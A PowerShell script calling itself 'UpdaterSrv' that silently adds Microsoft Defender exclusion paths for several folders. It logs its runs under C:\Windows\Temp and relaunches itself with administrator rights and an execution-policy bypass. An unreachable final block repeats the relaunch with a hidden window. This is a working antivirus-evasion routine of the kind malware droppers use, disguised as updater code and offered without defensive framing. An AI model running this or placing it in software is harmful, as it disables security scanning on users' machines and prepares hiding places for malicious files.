# Define a log file path accessible by most users (including LocalSystem)
$logPath = "C:\Windows\Temp\updater_log.txt"

try {
    # Get the current user running the script
    $currentUser = whoami

    # Create a log message with date and user info
    $logMessage = "UpdaterSrv script executed at $(Get-Date) by user $currentUser"

    # Append the log message to the log file
    $logMessage | Out-File -FilePath $logPath -Append -Encoding utf8
}
catch {
    # If writing to log fails, capture error details
    $errorMessage = "Failed to write log at $(Get-Date). Error: $_"
    $errorMessage | Out-File -FilePath $logPath -Append -Encoding utf8
}

# Desired exclusions
$foldersToEnsure = @(
    "C:\MySafeFolder",
    "D:\Projects\IgnoreThis",
    "C:\Temp\DevTools"
)

# Check current exclusions
$currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

# Find missing exclusions
$missingExclusions = $foldersToEnsure | Where-Object { $_ -notin $currentExclusions }

# Exit silently if all are already excluded
if ($missingExclusions.Count -eq 0) { exit }

# If running as admin, add exclusions
if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole] "Administrator")) {
    
    foreach ($folder in $missingExclusions) {
        try {
            Add-MpPreference -ExclusionPath $folder
        } catch {
            # Fail silently
        }
    }
    exit
}

# Relaunch script with admin rights (UAC will show)
Start-Process powershell.exe "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
exit


# Relaunch script with admin rights if needed
Start-Process powershell.exe "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs
exit
